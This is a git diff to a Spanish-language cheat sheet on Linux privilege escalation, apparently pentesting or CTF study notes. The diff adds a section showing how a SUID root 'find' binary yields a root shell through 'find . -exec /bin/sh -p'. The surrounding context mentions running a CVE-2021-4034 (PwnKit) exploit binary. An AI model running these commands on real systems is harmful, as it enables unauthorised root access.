@@ -52,7 +52,12 @@ Forma 2:
 ❯ make                     # Crear un compilado del binario 
 ❯ ./cve-2021-4034          # Ejecutar el binario 
 ```
+## Find 
+```bash 
+-rwsr-xr-x 1 root root /usr/bin/find 
 
+❯ find . -exec /bin/sh -p \; -quit    # Obtener consola como root
+```
 ## Base64
 ```bash 
 -rwsr-xr-x 1 root root /usr/bin/base64
